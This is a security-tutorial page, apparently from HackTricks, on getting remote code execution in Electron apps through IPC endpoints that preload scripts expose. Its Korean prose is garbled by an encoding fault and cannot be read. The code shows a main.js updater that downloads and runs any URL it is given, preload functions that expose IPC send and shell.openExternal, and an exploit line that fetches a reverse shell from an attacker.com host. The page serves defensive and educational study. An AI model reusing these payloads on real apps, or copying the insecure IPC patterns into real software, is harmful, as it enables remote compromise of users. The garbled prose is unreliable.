# Electron contextIsolation RCE via IPC

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”**.

</details>

ë§Œì•½ preload ìŠ¤í¬ë¦½íŠ¸ê°€ main.js íŒŒì¼ì—ì„œ IPC ì—”ë“œí¬ì¸íŠ¸ë¥¼ ë…¸ì¶œí•œë‹¤ë©´, ë Œë”ëŸ¬ í”„ë¡œì„¸ìŠ¤ëŠ” í•´ë‹¹ ì—”ë“œí¬ì¸íŠ¸ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìœ¼ë©° ì·¨ì•½í•˜ë‹¤ë©´ RCEê°€ ê°€ëŠ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ëŒ€ë¶€ë¶„ì˜ ì˜ˆì‹œëŠ” ì—¬ê¸°ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo). ìì„¸í•œ ì •ë³´ëŠ” ë¹„ë””ì˜¤ë¥¼ í™•ì¸í•˜ì„¸ìš”.

## ì˜ˆì‹œ 0

[https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21)ì—ì„œ ê°€ì ¸ì˜¨ ì˜ˆì‹œ (MS Teamsê°€ XSSì—ì„œ RCEë¡œ ë‚¨ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ì „ì²´ ì˜ˆì‹œê°€ ìˆìŠµë‹ˆë‹¤. ì´ê²ƒì€ ë§¤ìš° ê¸°ë³¸ì ì¸ ì˜ˆì‹œì…ë‹ˆë‹¤):

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

## ì˜ˆì‹œ 1

`main.js`ê°€ `getUpdate`ë¥¼ ìˆ˜ì‹ í•˜ê³  **ì „ë‹¬ëœ ëª¨ë“  URLì„ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¤í–‰**í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ í™•ì¸í•˜ì„¸ìš”.\
ë˜í•œ `preload.js`ê°€ mainì—ì„œ **ëª¨ë“  IPC ì´ë²¤íŠ¸ë¥¼ ë…¸ì¶œ**í•˜ëŠ” ë°©ë²•ì„ í™•ì¸í•˜ì„¸ìš”.
```javascript
// Part of code of main.js
ipcMain.on('getUpdate', (event, url) => {
console.log('getUpdate: ' + url)
mainWindow.webContents.downloadURL(url)
mainWindow.download_url = url
});

mainWindow.webContents.session.on('will-download', (event, item, webContents) => {
console.log('downloads path=' + app.getPath('downloads'))
console.log('mainWindow.download_url=' + mainWindow.download_url);
url_parts = mainWindow.download_url.split('/')
filename = url_parts[url_parts.length-1]
mainWindow.downloadPath = app.getPath('downloads') + '/' + filename
console.log('downloadPath=' + mainWindow.downloadPath)
// Set the save path, making Electron not to prompt a save dialog.
item.setSavePath(mainWindow.downloadPath)

item.on('updated', (event, state) => {
if (state === 'interrupted') {
console.log('Download is interrupted but can be resumed')
}
else if (state === 'progressing') {
if (item.isPaused()) console.log('Download is paused')
else console.log(`Received bytes: ${item.getReceivedBytes()}`)
}
})

item.once('done', (event, state) => {
if (state === 'completed') {
console.log('Download successful, running update')
fs.chmodSync(mainWindow.downloadPath, 0755);
var child = require('child_process').execFile;
child(mainWindow.downloadPath, function(err, data) {
if (err) { console.error(err); return; }
console.log(data.toString());
});
}
else console.log(`Download failed: ${state}`)
})
})
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
ipcRenderer.send(event, data);
};
```
ì•…ìš©:
```html
<script>
electronSend("getUpdate","https://attacker.com/path/to/revshell.sh");
</script>
```
## ì˜ˆì œ 2

preload ìŠ¤í¬ë¦½íŠ¸ê°€ ë Œë”ëŸ¬ì— ì§ì ‘ `shell.openExternal`ì„ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ë…¸ì¶œí•˜ëŠ” ê²½ìš° RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
shell.openExternal(url);
};
```
## ì˜ˆì œ 3

preload ìŠ¤í¬ë¦½íŠ¸ê°€ ì™„ì „íˆ ì£¼ìš” í”„ë¡œì„¸ìŠ¤ì™€ í†µì‹ í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ë…¸ì¶œí•˜ëŠ” ê²½ìš° XSSëŠ” ëª¨ë“  ì´ë²¤íŠ¸ë¥¼ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì˜í–¥ì€ ì£¼ìš” í”„ë¡œì„¸ìŠ¤ê°€ IPC ì¸¡ë©´ì—ì„œ ë…¸ì¶œí•˜ëŠ” ê²ƒì— ë”°ë¼ ë‹¤ë¦…ë‹ˆë‹¤.
```javascript
window.electronListen = (event, cb) => {
ipcRenderer.on(event, cb);
};

window.electronSend = (event, data) => {
ipcRenderer.send(event, data);
};
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong></summary>

ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì—ì„œ ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ì—ì„œ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
